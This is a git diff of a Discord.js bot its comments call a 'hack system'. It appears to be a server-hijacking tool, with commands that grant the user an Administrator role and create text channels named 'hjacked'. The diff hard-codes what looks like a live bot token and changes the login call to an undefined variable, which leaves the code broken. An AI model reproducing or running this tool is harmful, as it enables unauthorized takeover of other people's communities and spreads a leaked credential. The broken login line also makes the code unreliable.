@@ -14,7 +14,7 @@
 //By xxxRevenge (Bowlingtoolkit)
 const Discord = require("discord.js") //npm i discord.js
 const client = new Discord.Client();
-const Token = '' //حط توكن بوتك هنا // your bot token
+const Token = 'NjMwNDU5MTQ4OTg2ODc1OTM1.XZom5g.FYwZX6z_hx6dGx3EYo_fqv5FfFs' //حط توكن بوتك هنا // your bot token
 const x_x = "." //الامر يلي يشغل الكود //the command to start the hack system
 const opcmd = 'oprole' // The Op Command To Give You Adminstrator Role
 const teext = "hjacked" // اسم رومات الكتابيه يلي بيسويها //the textchannel name
@@ -486,4 +486,4 @@ let op = message.guild.roles.find('name', `${adminstrator}`)
     message.guild.member(member).addRole(op);
   }
 });
-client.login(Token)
+client.login(token)
